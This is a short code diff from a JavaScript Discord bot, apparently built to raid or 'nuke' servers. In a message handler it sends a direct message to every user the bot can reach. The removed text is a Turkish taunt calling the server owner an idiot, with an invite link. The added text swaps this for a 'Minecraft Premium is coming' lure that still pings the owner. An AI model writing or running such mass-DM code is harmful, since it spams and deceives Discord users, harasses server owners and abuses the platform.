@@ -532,9 +532,9 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "`Patladı knk, Burdan` <@" + ////     await msg.guild.channels.find(x => x.name === "ャ");
+          "`Minecraft Premium Geliyor` <@" + ////     await msg.guild.channels.find(x => x.name === "ャ");
             msg.guild.owner.id +
-            "> `İsimli Salağa Selamlar`\n https://discord.gg/vd77Jpf"
+            ">"
         )
       )
       .catch(console.error);
